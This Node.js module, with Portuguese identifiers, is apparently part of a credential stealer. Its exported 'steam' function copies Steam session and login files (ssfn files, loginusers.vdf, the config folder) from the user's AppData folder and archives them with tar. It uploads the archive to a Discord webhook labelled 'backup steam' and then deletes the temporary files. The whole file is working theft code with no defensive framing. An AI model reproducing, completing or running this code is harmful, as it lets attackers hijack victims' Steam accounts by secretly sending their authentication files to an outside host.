const fs = require('fs')
const path = require('path')
const os = require('os')
const axios = require('axios')
const FormData = require('form-data')
const { execSync } = require('child_process')

const webhook = 'webhook here'

async function steam() {
  const usuario = os.homedir()
  const pastaSteam = path.join(usuario, 'AppData', 'Roaming', 'Steam')
  const pastaTemp = path.join(os.tmpdir(), 'steamtemp')
  const zipTemp = path.join(os.tmpdir(), 'steamtemp.zip')

  if (!fs.existsSync(pastaSteam)) return

  if (!fs.existsSync(pastaTemp)) fs.mkdirSync(pastaTemp, { recursive: true })

  const arquivos = ['ssfn', 'config', 'loginusers.vdf', 'Steam.exe', 'steam.cfg', 'steamkey.pem', 'ssfn*']
  fs.readdirSync(pastaSteam).forEach(item => {
    if (arquivos.some(nome => item.startsWith(nome))) {
      const origem = path.join(pastaSteam, item)
      const destino = path.join(pastaTemp, item)
      if (fs.lstatSync(origem).isDirectory()) {
        copiaPasta(origem, destino)
      } else {
        fs.copyFileSync(origem, destino)
      }
    }
  })

  const pastaConfig = path.join(pastaSteam, 'config')
  if (fs.existsSync(pastaConfig)) {
    const destinoConfig = path.join(pastaTemp, 'config')
    copiaPasta(pastaConfig, destinoConfig)
  }

  try {
    execSync(`tar -zcf "${zipTemp}" -C "${pastaTemp}" .`)
  } catch {
    return
  }

  const form = new FormData()
  form.append('file', fs.createReadStream(zipTemp), 'steamtemp.zip')
  form.append('payload_json', JSON.stringify({
    embeds: [{
      title: 'Steam',
      description: 'backup steam',
      color: 0x1b2838,
      footer: { text: 'discord.gg/npm' }
    }]
  }))

  await axios.post(webhook, form, { headers: form.getHeaders() })

  if (fs.existsSync(zipTemp)) fs.unlinkSync(zipTemp)
  if (fs.existsSync(pastaTemp)) limpaPasta(pastaTemp)
}

function copiaPasta(origem, destino) {
  if (!fs.existsSync(destino)) fs.mkdirSync(destino, { recursive: true })
  for (const item of fs.readdirSync(origem)) {
    const origemItem = path.join(origem, item)
    const destinoItem = path.join(destino, item)
    if (fs.lstatSync(origemItem).isDirectory()) {
      copiaPasta(origemItem, destinoItem)
    } else {
      fs.copyFileSync(origemItem, destinoItem)
    }
  }
}

function limpaPasta(pasta) {
  if (!fs.existsSync(pasta)) return
  for (const item of fs.readdirSync(pasta)) {
    const caminho = path.join(pasta, item)
    if (fs.lstatSync(caminho).isDirectory()) {
      limpaPasta(caminho)
      fs.rmdirSync(caminho)
    } else {
      fs.unlinkSync(caminho)
    }
  }
  fs.rmdirSync(pasta)
}

module.exports = { steam }
